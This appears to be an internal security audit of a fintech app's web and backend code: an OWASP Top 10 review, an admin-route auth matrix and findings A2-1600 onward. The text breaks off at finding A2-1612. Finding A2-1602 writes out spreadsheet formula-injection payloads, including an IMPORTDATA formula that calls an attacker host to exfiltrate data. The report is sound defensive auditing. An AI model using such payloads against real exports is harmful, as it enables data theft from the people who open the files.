# Phase 12 — Security deep-dive

**Commit SHA:** `450011ded294b638703a9ba59f4274a3ca5b7187`
**Auditor:** cold-adversarial program, Phase 12.
**Scope:** OWASP Top-10 re-walk, plus Loop-specific security surfaces (Stellar, Capacitor, CTX proxy, admin panel, mobile shell). Per plan §Phase 12 + G5-71..88 + G6-22..27. No source / tracker / config modified; every finding filed under A2-1600..A2-1699. **New findings only**; prior-phase findings cross-referenced rather than duplicated.

**Method:**

- Cross-walked every prior `A2-*` finding tagged security and re-classified through the OWASP lens.
- Auth matrix enumerated from `apps/backend/src/app.ts` against `requireAuth` / `requireAdmin` middleware attachment points.
- Full unsafe-pattern grep across `apps/web/app/**` and `apps/backend/src/**`.
- Read the full auth stack: `auth/handler.ts` (407 LOC), `auth/jwt.ts` (43 LOC — Loop-JWT decode, CTX legacy path), `auth/tokens.ts` (173 LOC — HS256 sign/verify), `auth/otps.ts` (132 LOC), `auth/social.ts` (212 LOC), `auth/id-token.ts` (246 LOC — JWKS verifier), `auth/identities.ts` (129 LOC), `auth/refresh-tokens.ts` (103 LOC), `auth/native.ts` (242 LOC), `auth/require-admin.ts` (56 LOC).
- Read secret redaction (`logger.ts` — 97 LOC), env loader (`env.ts` — 370 LOC), image proxy (`images/proxy.ts` — 364 LOC), circuit breaker (`circuit-breaker.ts` — 207 LOC), CSV export primitives, Sentry init sites on web + backend.
- Cross-checked `openapi.ts` for internal-path exposure; read all `db.execute(sql\`…\`)` call sites for raw-SQL injection surface.

---

## 1. OWASP Top 10 — 2021 per-category verdict

| Code         | Name                                     | Verdict              | Primary evidence                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| ------------ | ---------------------------------------- | -------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **A01:2021** | Broken Access Control                    | **Medium — at-risk** | Admin middleware is globally attached at `app.ts:940–941` (`app.use('/api/admin/*', requireAuth); app.use('/api/admin/*', requireAdmin);`) so every admin route declared below is covered (see §3 matrix). BUT `requireAdmin` decodes the CTX-legacy JWT without signature verification (A2-550 — prior); `requireAuth` accepts an unverified CTX bearer (A2-550). Privilege-escalation vectors enumerated in §6 turn up no `is_admin` body-writable path, but **no CSRF on admin writes** if cookies are ever introduced (A2-1615 — belt-and-braces; current state uses Bearer so no active CSRF — but the gap is a design choice with no test). `/metrics` (auth-free) leaks circuit state + route cardinality (A2-1606). `/openapi.json` (auth-free) exposes 97 admin paths for discovery (A2-1607).                                                                                  |
| **A02:2021** | Cryptographic Failures                   | **Medium — at-risk** | Loop-native JWT is HS256, key enforced `min(32)` at `env.ts:141–148`, verified in constant-time (`timingSafeEqual`, `tokens.ts:131`). No `iss` / `aud` claim on Loop JWTs (A2-1600). Web Sentry DSN not redacted — acceptable (browser-baked, public by design). Backend redaction list (`logger.ts:16–81`) covers `*.operatorSecret` and the stellar env names, but **omits `LOOP_JWT_SIGNING_KEY` / `LOOP_JWT_SIGNING_KEY_PREVIOUS` / `DATABASE_URL` / `SENTRY_DSN` / `DISCORD_WEBHOOK_*`** (A2-1601). Refresh tokens hash-verified at rest (`refresh-tokens.ts:20`). OTP hashes SHA-256 (`otps.ts:38`).                                                                                                                                                                                                                                                                               |
| **A03:2021** | Injection                                | **Low**              | No raw interpolation in `sql\`...\``— every template site interpolates either a column reference or a parametrised value (Drizzle parametrises both). Verified by grep across`apps/backend/src/admin/_.ts`(40 sites); all use`${column}` / `${paramValue}`not`${rawString}`. One XSS-adjacent `dangerouslySetInnerHTML`at`root.tsx:218`with a static-literal`\_\_html`(theme bootstrap script) — no user input. Two`innerHTML`assignments:`ClusterMap.tsx:213–231`already escapes every interpolation (phase-8b verdict);`app-lock.ts:95` uses only module-constant strings. **CSV formula injection** (`=`, `+`, `-`, `@`, `\t`) is unhandled across all 14 `_-csv.ts` handlers — A2-1602.                                                                                                                                                                                              |
| **A04:2021** | Insecure Design                          | **Medium**           | Circuit-breaker DoS (A2-1603): a malicious client who can induce an upstream 5xx (e.g. submit a request against `/login` that CTX returns 5xx for five times in a row) trips the per-endpoint breaker for 30s, denying all legit traffic on that path. Individual endpoint categories mitigate blast radius but the breaker still fails CLOSED for legit users.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| **A05:2021** | Security Misconfiguration                | **High**             | Web app (`apps/web/fly.toml` runs `react-router-serve`) emits **no `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Strict-Transport-Security`, `Permissions-Policy`, `COOP`, or `CORP` headers in production** — `buildSecurityHeaders` utility at `security-headers.ts:36–70` is wired only for unit tests and for the meta-tag-emitted CSP subset in `root.tsx:205`. HSTS totally absent on loopfinance.io (A2-1604). `DISABLE_RATE_LIMITING` env var has no production guard at boot (`env.ts:98` + `app.ts:264`) — an operator can footgun every per-IP limit off in prod (A2-1605). `/metrics` reachable unauth on public origin (A2-1606). `/openapi.json` exposes the full admin surface map on the public origin (A2-1607). Hono `secureHeaders()` on backend DOES emit HSTS / X-Content-Type-Options / X-Frame-Options by default — backend is OK, web is not. |
| **A06:2021** | Vulnerable & Outdated Components         | **Low**              | Covered by Phase 3 — `npm audit` clean, `esbuild` duplicate versions filed as A2-308 (Low). Phase-12 adds no new dep findings.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| **A07:2021** | Identification & Authentication Failures | **High**             | Refresh-token reuse is detected at `auth/native.ts:215–222` — the code comments call it a "token-theft signal" — but **the handler only 401s; it does NOT bulk-revoke the user's live refresh tokens** (A2-1608). OTP replay + enumeration mitigated (`auth/handler.ts:86–90` — generic 200; per-email throttle `auth/native.ts:60–67`). Social nonce replay still open (prior A2-566). Loop JWT lacks `iss` / `aud` (A2-1600). Session fixation — no pre-auth identifier survives auth (Hono reuses no session state; requireAuth reads bearer from each request; OK). Admin step-up auth is absent — `requireAdmin` is bit-level only; a stolen admin bearer inside the 15-min access TTL can silently issue unlimited credit adjustments (A2-1609).                                                                                                                                   |
| **A08:2021** | Software & Data Integrity Failures       | **Medium**           | CTX upstream responses are Zod-validated before forwarding (`auth/handler.ts:41–49`) but only for auth — `merchants/sync.ts` / orders proxy trust wider upstream shapes. Already surfaced in phase-5 (A2-52x series). CSP `script-src 'self' 'unsafe-inline'` on web (`security-headers.ts:43`) — unavoidable for the theme-bootstrap script but widens XSS blast radius. No SRI on Google Fonts / GSI script (A2-1611).                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| **A09:2021** | Security Logging & Monitoring Failures   | **Medium**           | Pino redact list is good enough for known fields but misses the env-name variants listed under A02 above (A2-1601). Sentry has no `beforeSend` scrubber on either runtime (prior A2-1308). Discord audit channel leaks full admin email (prior A2-1315). No log-retention / egress ADR (prior A2-1320). OTP console-email provider log line at `auth/email.ts:38–45` emits the raw OTP code at `info` level — if Sentry breadcrumb integration is ever flipped on (`@sentry/pino` etc.) this becomes a live OTP leak. A2-1612.                                                                                                                                                                                                                                                                                                                                                           |
| **A10:2021** | Server-Side Request Forgery              | **Medium**           | Image-proxy allowlist enforced in prod via `env.ts:352–363`; IP-class check at `images/proxy.ts:303–337` is thorough (covers `::ffff:`/CGNAT/link-local/multicast). DNS-rebinding TOCTOU documented as `KNOWN LIMITATION` in source (`proxy.ts:233–241`) — prior A2-672. No other outbound-from-user-input handler exists — confirmed by grep of `fetch(` with interpolated URLs: the only such handler is `images/proxy.ts`. Backend also egresses to JWKS (`id-token.ts:56` — fixed URLs per-provider), CTX (env-fixed base), Horizon (env-fixed), Discord (env-fixed webhooks), Sentry (env-fixed DSN). No per-handler **egress allowlist** — if a future dev adds an SSRF-susceptible surface, nothing in the runtime blocks arbitrary egress (A2-1613 — G6-25).                                                                                                                     |

---

## 2. Consolidated security-finding map (prior A2-IDs)

Re-surfaced from prior phases, re-classified against OWASP Top 10 in the table above. **None re-filed here**; listed so the final tracker cross-reference is unambiguous.

| Prior ID | Category  | One-liner                                                                                                    | Phase |
| -------- | --------- | ------------------------------------------------------------------------------------------------------------ | ----- |
| A2-119   | A05 / ORG | LoopDevs org does not require 2FA                                                                            | 1     |
| A2-103   | A01       | `CODEOWNERS` references a team that does not exist                                                           | 1     |
| A2-114   | A08       | `superfly/flyctl-actions@master` moving-ref action                                                           | 1     |
| A2-125   | A05       | No `SECURITY.md` on public pre-launch repo (G5-88 / G5-103)                                                  | 1     |
| A2-406   | A08       | Native overlay script overwrites assets unconditionally                                                      | 4     |
| A2-550   | A07       | Unverified CTX JWT accepted; requireAuth / requireAdmin decode without signature verify                      | 5b    |
| A2-551   | A07       | `PUT /api/users/me/stellar-address` body can redirect cashback payouts                                       | 5b    |
| A2-552   | A07       | `POST /api/users/me/home-currency` body re-reads bearer without verify                                       | 5b    |
| A2-566   | A07       | Social-login: no `nonce` validation on Google / Apple id_tokens                                              | 5b    |
| A2-567   | A07       | Social-login: `iss` drift (Google `accounts.google.com` vs `https://accounts.google.com`) acceptance pattern | 5b    |
| A2-571   | A05       | `EMAIL_PROVIDER=console` accepted explicitly in production                                                   | 5b    |
| A2-655   | A09       | Pino REDACT_PATHS insufficient for env-name-variant keys                                                     | 5d    |
| A2-672   | A10       | Image-proxy DNS-rebinding TOCTOU documented but not fixed                                                    | 5d    |
| A2-308   | A06       | `esbuild` duplicate installed versions (+ 51 other transitive dupes)                                         | 3     |
| A2-1308  | A09       | Neither Sentry SDK has `beforeSend`; no PII scrub                                                            | 13    |
| A2-1313  | A09       | Full user email leaked to `orders` Discord channel                                                           | 13    |
| A2-1314  | A09       | Full userId / orderId / payoutId in monitoring channel                                                       | 13    |
| A2-1315  | A09       | Full admin email leaked to admin-audit Discord channel                                                       | 13    |

---

## 3. Auth matrix — admin routes

**Method.** Enumerated every `app.get|post|put|delete('/api/admin/…'`) registration in `apps/backend/src/app.ts` and tested against the two preceding middlewares `app.use('/api/admin/*', requireAuth);` (L940) and `app.use('/api/admin/*', requireAdmin);` (L941).

**Result.** **All 97 admin routes are covered by both middlewares.** Middlewares are declared BEFORE the first admin handler at L943. No admin route lives outside `/api/admin/*`. `app.notFound` and `app.onError` are below the last admin registration. The registered admin write endpoints — `PUT /api/admin/merchant-cashback-configs/:merchantId` (L968), `POST /api/admin/payouts/:id/retry` (L1026), `POST /api/admin/users/:userId/credit-adjustments` (L1496), `POST /api/admin/merchants/resync` (L1505), `POST /api/admin/discord/test` (L1514) — ALL require `Idempotency-Key` (the first three) or are read-only side-effects. No `is_admin` body field is accepted by any handler (verified by grep of `isAdmin` / `is_admin` across all admin handlers — zero hits in zod schemas; the field is only set by the `env.ADMIN_CTX_USER_IDS` allowlist at `db/users.ts` upsert time).

**Coverage verdict:** pass on structure. **Fail on strength** — the underlying middleware still accepts unverified CTX JWTs (A2-550), which means the admin check is only as strong as the CTX issuer. On the Loop-native path the JWT is verified; on the CTX path (`requireAuth` legacy branch at `auth/handler.ts:387–406`) it is not.

---

## 4. Unsafe-pattern scan — results

Grepped across `apps/**/*.{ts,tsx,js,jsx}` for:

| Pattern                           | Hits                                                            | Disposition                                                                                                                     |
| --------------------------------- | --------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| `dangerouslySetInnerHTML`         | 1 (`root.tsx:218`)                                              | Static literal `__html`; theme-bootstrap IIFE; no user input. Safe.                                                             |
| `document.write`                  | 0                                                               | —                                                                                                                               |
| `eval(`                           | 0                                                               | —                                                                                                                               |
| `new Function`                    | 0                                                               | —                                                                                                                               |
| `setTimeout(<string>`             | 0                                                               | Only numeric-arg `setTimeout` sites — `app-lock.ts:114`, tests. Safe.                                                           |
| `innerHTML =`                     | 3 (`app-lock.ts:95`, `ClusterMap.tsx` popup/divIcon, test stub) | `app-lock.ts` uses only module-constant strings; `ClusterMap.tsx` `escapeHtml` applied to every interpolation (phase-8b). Safe. |
| `outerHTML =`                     | 0                                                               | —                                                                                                                               |
| `.exec(` with user input          | 3 matches                                                       | All regex-literal `exec` on trusted shape strings (uuid, path-parsing, Stellar amount). Safe.                                   |
| `sql\`…\`` with raw interpolation | 40+ hits                                                        | All parametrised through Drizzle — interpolated nodes are `{column}` refs or `{paramValue}` bound parameters. Safe.             |

No unsafe XSS / RCE surface identified in source.

---

## 5. Malicious-admin model walk

Per plan §1.1 adversary profile "Malicious admin". Assume the admin bit is set (CTX user id in `ADMIN_CTX_USER_IDS` allowlist) and the admin has a live 15-min access token.

**What they can do silently:**

- **Unbounded credit adjustments** within ±10_000_000 minor units (`credit-adjustments.ts:49`) by reusing a single idempotency key across requests is prevented by the snapshot replay (L115–131), but generating fresh keys is trivial — 10k/min rate limit times ±10_000_000 = arbitrary balance in 1 minute. No per-admin-per-day value cap, no multi-admin approval gate for over-threshold writes.
- **Retry a stuck payout** (`payouts.ts` retry handler at L1026) — fine in isolation, but retry implements no "sanity check" on the retry reason, so an admin can drain an operator wallet into a specific user's wallet once cashback exists on the ledger.
- **Mutate cashback config** for any merchant (`admin/handler.ts:43–124`) — `wholesalePct + userCashbackPct + loopMarginPct ≤ 100` is the only check. An admin can set `userCashbackPct=99` on a merchant and mint 99% cashback on every order until a second admin catches it via the Discord admin-audit channel.
- **Resync merchants** (`/api/admin/merchants/resync`) — pulls from upstream CTX; no source review, but also no direct write surface they could abuse — just force a refresh.
- **Export full user PII** via `/api/admin/user-credits.csv`, `/api/admin/orders.csv` — emails and balances included in plaintext. No per-export rate-cap (10/min is generous for exfiltration).

**What the system catches:**

- Every write lands in the `admin_audit` + the fire-and-forget `notifyAdminAudit` Discord embed (`discord.ts:407` — full admin email included).
- `admin_idempotency_keys` row is written on success (`credit-adjustments.ts:181–194`) — after-the-fact forensics.
- No multi-admin approval; no delay-queue for over-threshold writes.

**Finding A2-1609** files the missing step-up (re-auth) for destructive writes. **Finding A2-1610** files the missing per-admin-per-day magnitude cap. The audit trail is necessary but a single admin can still cause significant damage between commit and human review.

---

## 6. Privilege-escalation paths (G5-71)

Enumerated every handler that reads `req.json()` and writes to a table where `is_admin` lives (`users` table).

| Handler                                                         | Writes to `users`?                                                                  | Writes `is_admin`?                                                                               |
| --------------------------------------------------------------- | ----------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ |
| `setHomeCurrencyHandler` (`users/handler.ts:130`)               | yes — `set({ homeCurrency })` only                                                  | no                                                                                               |
| `setStellarAddressHandler` (`users/handler.ts:207`)             | yes — `set({ stellarAddress })` only                                                | no                                                                                               |
| `resolveOrCreateUserForIdentity` (`auth/identities.ts:80–99`)   | yes — `insert` with explicit "isAdmin defaults to false" comment at L85             | **body of the users insert omits isAdmin — the DB default (false) wins. No body-writable path.** |
| `upsertUserFromCtx` (`db/users.ts` — via `require-admin.ts:40`) | yes — sets `is_admin` from `ADMIN_CTX_USER_IDS` env allowlist, NOT from token claim | no body path                                                                                     |

**Result:** no privilege-escalation surface. `is_admin` is set exclusively from the server-side `ADMIN_CTX_USER_IDS` env allowlist evaluated at upsert time. No API body field, no social-login claim, no `/me` PATCH writes it. Correct by design.

Adjacent concern: **the allowlist is matched on CTX `sub` (JWT subject)**, which is accepted without signature verification on the legacy CTX path (A2-550). A forged CTX JWT with a known admin `sub` would pass — but A2-550 already files this; not duplicating.

---

## 7. New findings (A2-1600 … A2-1699)

Severity per plan §3.4. Auth/token/crypto findings default High or Critical.

### A2-1600 — High — Loop-signed JWT lacks `iss` / `aud` claims

**Surface:** Phase 12 §A02.

**Evidence:** `apps/backend/src/auth/tokens.ts:75–81` — the signed `LoopTokenClaims` shape is `{ sub, email, typ, iat, exp, jti? }`. No `iss` ("this is Loop") and no `aud` (who is the intended consumer). `verifyLoopToken` checks `typ`, `exp`, signature, but no `iss`/`aud`.

**Exploit / impact:** If Loop ever spins up a second backend that shares the signing key (for example, a planned admin-only micro-service), a token minted by one is indistinguishable from a token minted by the other. Same risk if the signing key is ever reused for a webhook-HMAC or CSRF-token purpose (which the plan lists as a future need). `aud` binding is the standard RFC 7519 way to scope a token to a specific consumer; its absence is an invariant not worth assuming.

**Proposed remediation:** Add `iss: 'loop-backend'` (or similar) and `aud: ['loop-web', 'loop-mobile']` to `LoopTokenClaims`. Verify both in `verifyLoopToken`. Reject on mismatch.

---

### A2-1601 — High — Pino `REDACT_PATHS` missing `LOOP_JWT_SIGNING_KEY`, `DATABASE_URL`, `SENTRY_DSN`, `DISCORD_WEBHOOK_*`

**Surface:** Phase 12 §A02 / §A09. Cross-cut with A2-655 (prior: env-name variants) but a different set of missing names.

**Evidence:** `apps/backend/src/logger.ts:16–81`. The list redacts `operatorSecret` + the Stellar env names explicitly, plus generic `secret`/`password`/`apiKey` tokens. It does **not** redact:

- `LOOP_JWT_SIGNING_KEY` / `LOOP_JWT_SIGNING_KEY_PREVIOUS` — HS256 symmetric secret; a leak to logs lets an attacker forge arbitrary Loop tokens.
- `DATABASE_URL` — contains Postgres password in the URL.
- `SENTRY_DSN` — low-value (DSNs are not admin tokens) but still a fingerprint.
- `DISCORD_WEBHOOK_ORDERS` / `_MONITORING` / `_ADMIN_AUDIT` — post-able by anyone who has the URL; webhook spoof lets an attacker inject fake "admin credit adjustment" embeds.

**Exploit / impact:** Today no site logs `env` directly, so this is latent. A future developer who logs `env` for ops-debugging purposes (the kind of change a mid-incident "log full env" is trivially written) leaks every field not in the list. Defense-in-depth pattern is to redact the env's secret-bearing keys proactively.

**Proposed remediation:** Add the env-variable names above to `REDACT_PATHS`. Also add a typed helper `redactedEnv()` that returns `env` with these fields replaced — callers who need to dump the env go through it.

---

### A2-1602 — Medium — Admin CSV exports do not defend against spreadsheet formula injection

**Surface:** Phase 12 §A03.

**Evidence:** All `csvEscape(value)` implementations (14 handlers under `apps/backend/src/admin/*-csv.ts`; canonical example `user-credits-csv.ts:28–33`):

```ts
function csvEscape(value: string): string {
  if (/[",\r\n]/.test(value)) {
    return `"${value.replace(/"/g, '""')}"`;
  }
  return value;
}
```

Handles RFC 4180 quoting but not leading `=`, `+`, `-`, `@`, `\t`, `\r` that trigger formula evaluation in Excel / LibreOffice / Google Sheets. User-controlled fields exported unescaped: `users.email` (e.g. `user-credits-csv.ts:72`), `reason` on credit-adjustment audit exports, merchant names from upstream CTX catalog (via `merchants-catalog-csv.ts`).

**Exploit / impact:** A user registers with email `=HYPERLINK("https://attacker.example","Click")@loopfinance.io` (valid under most email regex; Zod `.email()` accepts `=…@…`). When an admin downloads `/api/admin/user-credits.csv` and opens it in Excel, the cell is rendered as a hyperlink to the attacker's URL. More advanced: `=IMPORTDATA("https://attacker/…")` in Google Sheets exfiltrates data on every open. Merchant names from upstream CTX are also in scope — a compromised CTX (threat model row) could seed `"=cmd|…"`-style payloads.

**Proposed remediation:** Prefix any field that begins with `= + - @ \t \r` with a single quote (`'`) inside `csvEscape`. Alternatively, reject such emails at `users.email` insert time — but the backwards-compatible fix is the escape-prefix.

---

### A2-1603 — Medium — Circuit breaker tripping is a DoS amplifier

**Surface:** Phase 12 §A04.

**Evidence:** `apps/backend/src/circuit-breaker.ts:94–108`. Five consecutive upstream 5xx responses from `/login` → breaker opens for 30s → every legit `POST /api/auth/request-otp` returns `503 SERVICE_UNAVAILABLE` for the next 30s (`auth/handler.ts:97–102`). The per-endpoint split (`login`, `verify-email`, `refresh-token`, `logout`, `merchants`, `locations`, `gift-cards`) limits blast radius to a single endpoint at a time.

**Exploit / impact:** An attacker who can induce upstream 5xx (e.g. malformed body that CTX mishandles; slow-loris style against CTX with a timeout that we count as failure) can deny legit auth for 30s at a time, repeatable. The mitigations — per-endpoint isolation, half-open probe — prevent a shared denial, but they don't prevent a category denial. Combined with rate-limit-by-IP from 5/min on `request-otp`, an attacker paying the IP cost can sustain the denial.

**Proposed remediation:** Treat breaker-level errors as probabilistic rather than hard-cut — sample a fraction of requests through OPEN as synthetic probes. Or: distinguish "upstream 5xx" (count) from "our timeout" (don't count) since the timeout can be attacker-induced. Or: reduce the open-cooldown to 10s; 30s is a long denial window for an auth path. This is a design finding, not an immediate-ship blocker; documenting it so the remediation queue has it.

---

### A2-1604 — High — Web app emits no `X-Frame-Options`, `HSTS`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`, `COOP`, or `CORP` in production

**Surface:** Phase 12 §A05 (G5-77, G5-85, G5-87).

**Evidence:** `apps/web/Dockerfile` runs `npx react-router-serve ./build/server/index.js`. React Router's `serve` package does not emit security headers by default. `apps/web/app/utils/security-headers.ts` exports `buildSecurityHeaders()` returning the full header set, but it is called **only** from:

1. `apps/web/app/utils/__tests__/security-headers.test.ts` — assertions on the header shape.
2. `apps/web/app/root.tsx:190` — for the `Content-Security-Policy` meta tag (a subset, with `frame-ancestors`/`report-uri`/`sandbox` stripped because meta-emission rejects them).

No runtime hook installs the rest of the headers. `apps/web/fly.toml` sets `force_https = true` (redirect-to-HTTPS) but that is **not HSTS** — Fly does not automatically inject an `HSTS` header on 200 responses. Result:

- `X-Frame-Options`: absent → meta-CSP `frame-ancestors 'none'` provides most of the defense (supported browsers), but edge-case clients and sub-resources aren't covered.
- `X-Content-Type-Options: nosniff`: absent → old IE/Edge behavior undefined; modern browsers default to strict-mime for script/style but not for image/video.
- `Strict-Transport-Security`: absent → the initial navigation to `http://loopfinance.io` is redirect-able by an on-path attacker before HTTPS pinning engages. A first-time visitor on an insecure network is exposed on the first click.
- `Referrer-Policy`: meta-tag-set at `root.tsx:206` = `strict-origin-when-cross-origin`. Meta is authoritative for link navigations but some image/script referrers may differ.
- `Permissions-Policy`: absent → `camera`, `microphone`, `geolocation`, `payment` are default-allowed. Combined with the fact the app requests geolocation legitimately, a cross-origin iframe (even though CSP forbids embed) or a same-origin future injection could silently enable unwanted APIs.
- `Cross-Origin-Opener-Policy` / `Cross-Origin-Resource-Policy`: absent → no isolation from Spectre-class side channels; the React SSR surface is not same-origin-isolated.

**Exploit / impact:** HSTS missing is the most material — a first-time visitor over hotel/airport WiFi can have the login request MITM'd. Clickjacking is mitigated by meta `frame-ancestors`. Permissions-Policy is fleet-hygiene.

**Proposed remediation:** Write a tiny Hono-style or custom Express wrapper around `react-router-serve` that attaches `buildSecurityHeaders(…)` to every response. Alternative: front the `react-router-serve` process with nginx / the Fly edge (Fly doesn't inject headers but can be configured to). The `security-headers.ts` utility already exists — just needs to be wired.

---

### A2-1605 — Medium — `DISABLE_RATE_LIMITING` has no production-boot guard

**Surface:** Phase 12 §A05.

**Evidence:** `apps/backend/src/env.ts:92–98` — the schema allows `DISABLE_RATE_LIMITING=true` with a comment "production must never set this". `apps/backend/src/app.ts:264–267` — if set, every `rateLimit(...)` middleware early-returns without a check on `NODE_ENV`. No boot-time `throw` in `parseEnv()` similar to the `IMAGE_PROXY_ALLOWED_HOSTS` guard at `env.ts:352–363`.

**Exploit / impact:** A mis-configured prod deploy (e.g. operator copy-pastes the test harness env into prod) or a compromised deploy pipeline (A2-114) silently disables **every** per-IP rate limit — including `5/min` on `request-otp` and `10/min` on `verify-otp`. OTP brute force against a 6-digit code becomes ~1M/min feasible.

**Proposed remediation:** Mirror the image-proxy guard: in `parseEnv`, if `NODE_ENV === 'production' && DISABLE_RATE_LIMITING === true`, throw with a clear message unless `DANGEROUSLY_DISABLE_RATE_LIMITING_IN_PRODUCTION=1` is also set. Loud is the goal.

---

### A2-1606 — Medium — `/metrics` is reachable unauthenticated on the public origin

**Surface:** Phase 12 §A05 / §A09 (G5-76).

**Evidence:** `apps/backend/src/app.ts:403–441` — `app.get('/metrics', …)` has no `requireAuth`, no `rateLimit`. It emits:

- `loop_rate_limit_hits_total` — free-form counter (low-value to leak)
- `loop_requests_total{method,route,status}` — enumerates every server-side matched route → an attacker maps your API surface including every admin-route pattern from the labelled values.
- `loop_circuit_state{endpoint}` — leaks which upstream endpoints are currently degraded, a live-ness signal an attacker can pair with targeted load.

**Exploit / impact:** Reconnaissance. An attacker scraping `/metrics` every 10s gets a real-time view of circuit health and can time a load attack to the half-open window. A malicious bot with unlimited IPs could scrape at will (no per-IP limit on `/metrics`).

**Proposed remediation:** Either (a) gate `/metrics` behind `requireAdmin` + IP-allowlist Fly internal, (b) serve on a separate port that is not exposed in `fly.toml [[services]]`, or (c) move to a Prometheus push-gateway topology. Also add a rate limit (60/min) to the current endpoint as a stop-gap.

---

### A2-1607 — Medium — `/openapi.json` exposes the full admin surface map unauthenticated

**Surface:** Phase 12 §A05 (G5-76).

**Evidence:** `apps/backend/src/app.ts:449–451` — `app.get('/openapi.json', …)` with `Cache-Control: public, max-age=3600`, no auth. `apps/backend/src/openapi.ts` registers 97 `/api/admin/*` paths (grepped: `grep -c '/api/admin' openapi.ts` = 97). Each entry includes the method, path parameters, request/response schemas.

**Exploit / impact:** Reconnaissance. Any client can pull the list of every admin route, request schema (including idempotency-key requirement), and response shape — a complete attack-surface map for free. Includes endpoints the web app does not call (admin-only routes otherwise invisible to a non-admin caller).

**Proposed remediation:** Either (a) `requireAdmin` on `/openapi.json`; the schema is internal, (b) generate two specs — `openapi.public.json` at the current path, `openapi.admin.json` behind `requireAdmin` — and only register admin paths in the latter, or (c) strip admin entries at serve time when the caller isn't authenticated. Option (b) matches the web/admin split already present in the routing.

---

### A2-1608 — High — Refresh-token reuse detected but does not trigger family-revoke

**Surface:** Phase 12 §A07 (G5-71 adjacency).

**Evidence:** `apps/backend/src/auth/native.ts:215–222`:

```ts
if (row === null) {
  // Either the row is missing (attacker forged a signature with a
  // stolen key — already caught by verify — or we've rotated
  // behind it) or it's revoked (reuse of a previously-rotated
  // refresh — token-theft signal). Either way, 401.
  log.warn({ jti: claims.jti, sub: claims.sub }, 'Refresh token not live');
  return c.json({ code: 'UNAUTHORIZED', message: 'Invalid refresh token' }, 401);
}
```

The comment explicitly identifies the "reuse of a previously-rotated refresh" case as a token-theft signal, but the handler only returns 401. It does not call `revokeAllRefreshTokensForUser(claims.sub)` (the function exists at `refresh-tokens.ts:96–102`). This is the one signal that definitively tells us the token is in the wrong hands; discarding it is a missed opportunity.

**OWASP** (ASVS v4.0 §3.5 / refresh-token best practice): on reuse detection, revoke the entire refresh-token family for the user. RFC 6819 §5.2.2.3 echoes.

**Exploit / impact:** An attacker who steals a refresh token and successfully rotates it once has the victim's account with effectively `refreshTTL=30d` of lifetime. When the legit user later tries to rotate their (now-stale) refresh, we log a warning and 401 them — but the attacker's fresh refresh keeps working for another 30 days.

**Proposed remediation:** In the `row === null` branch, call `revokeAllRefreshTokensForUser(claims.sub)` and emit a Discord audit embed. The legit user's next login flow is a full re-auth (OTP or social), which is the right UX for a security event.

---

### A2-1609 — High — No step-up auth for destructive admin actions

**Surface:** Phase 12 §A07 (G5-75).

**Evidence:** The three admin write endpoints — `POST /api/admin/users/:userId/credit-adjustments` (`credit-adjustments.ts`), `POST /api/admin/payouts/:id/retry` (`payouts.ts`), `PUT /api/admin/merchant-cashback-configs/:merchantId` (`admin/handler.ts`) — all gate on the admin bit alone. A 15-minute access token, once issued, authorises every write until expiry. No re-auth prompt, no WebAuthn-touch, no approval by a second admin.

**Exploit / impact:** A stolen access token (XSS on a compromised admin device; browser-extension theft; shoulder-surf on a cafe laptop) within its TTL can issue unlimited credit adjustments up to ±10_000_000 minor units each, bounded only by rate limits (10/min on the adjust endpoint). Damage scales as `minutes_of_token_lifetime × 10 × 10_000_000 minor`. The Discord audit trail catches it after-the-fact; it does not prevent it.

**Proposed remediation:** Gate each destructive admin endpoint on a short-lived "step-up" token minted by a re-auth flow (OTP / WebAuthn / biometric), TTL ~60s, single-use. The admin UI prompts on the write; the backend rejects without the step-up header. This is the standard pattern for banking-grade admin panels (ADR-018 mentions "break-glass" but doesn't require step-up).

---

### A2-1610 — Medium — No per-admin-per-day magnitude cap on credit adjustments

**Surface:** Phase 12 §A07 (G5-75 adjacency).

**Evidence:** `apps/backend/src/admin/credit-adjustments.ts:42–56`. Each adjustment is capped at `±10_000_000 minor` per request. The rate limiter allows 10 requests per minute per IP. No per-admin cumulative cap.

**Exploit / impact:** Even with rate-limit active, a malicious admin can issue `10 × 10_000_000 × 60 × 8h = 4.8 × 10^10 minor` (48 million dollars / 60 billion pence) in a single 8-hour shift. Well above anything business-sensible.

**Proposed remediation:** Daily rolling window per `actor.id`: e.g. sum absolute `amountMinor` for the trailing 24h, reject if exceeding `1_000_000 minor` (10,000 major) without a second approver. Cap is a config; starting value negotiable.

---

### A2-1611 — Low — No Subresource Integrity on Google Fonts / GSI script

**Surface:** Phase 12 §A08.

**Evidence:** `apps/web/app/root.tsx:134–143` — Google Fonts stylesheet tag has no `integrity=` / `crossorigin=anonymous`. Google Identity Services (`https://accounts.google.com/gsi/client`) is loaded on demand in the social-login component (also without SRI — the script is dynamically injected, SRI can't protect it). `security-headers.ts:43` allows `script-src … https://accounts.google.com`.

**Exploit / impact:** A Google/Fastly-level supply-chain compromise or cache-poisoning attack on the fonts CDN could serve altered content that runs in the origin. SRI is defense-in-depth against a trusted-CDN compromise.

**Proposed remediation:** SRI on the stylesheet tag (accept weekly rotation churn). GSI script can't be SRI-pinned (Google rotates without a hash manifest); document the risk explicitly in `docs/adr/005-known-limitations.md`.

---

### A2-1612 — Medium — `ConsoleEmailProvider` logs raw OTP at info-level; any future Sentry-breadcrumb integration leaks it

**Surface:** Phase 12 §A09.

